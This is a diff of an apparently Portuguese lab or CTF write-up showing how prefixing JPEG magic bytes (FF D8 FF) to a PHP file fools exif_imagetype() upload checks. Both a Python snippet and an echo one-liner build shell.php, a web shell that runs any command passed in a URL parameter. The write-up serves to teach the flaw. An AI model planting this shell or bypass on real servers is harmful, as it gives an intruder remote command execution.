@@ -21,11 +21,6 @@ if(!exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
     echo "File is not an image";
 }
 ```
-ou
-
-```shell
-echo -e '\xFF\xD8\xFF<?php system($_GET["cmd"]); ?>' > shell.php
-```
 
 A função `exif_imagetype()` verifica apenas os **primeiros bytes** do arquivo — os chamados **magic bytes** — para determinar o tipo. Um arquivo JPEG começa com:
 
@@ -47,6 +42,12 @@ Criei um arquivo `shell.php` com os magic bytes de JPEG no início, seguidos do 
 with open("shell.php", "wb") as f:
     f.write(b'\xFF\xD8\xFF')
     f.write(b'<?php system($_GET["cmd"]); ?>')
+```
+
+ou
+
+```shell
+echo -e '\xFF\xD8\xFF<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
 O arquivo começa com `FF D8 FF` (magic bytes de JPEG), enganando o `exif_imagetype()`, mas ainda contém código PHP executável.
